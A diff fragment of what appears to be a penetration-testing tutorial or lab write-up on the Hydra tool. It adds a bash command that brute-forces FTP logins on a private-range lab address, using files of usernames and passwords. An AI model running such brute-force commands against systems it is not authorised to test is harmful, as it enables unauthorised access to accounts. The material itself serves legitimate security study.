@@ -73,3 +73,5 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-14 16:59:
 we will create two files containing usernames and passwords.
 
 ```bash
+hydra -V -L usernames -P passwords 192.168.133.129 ftp
+```
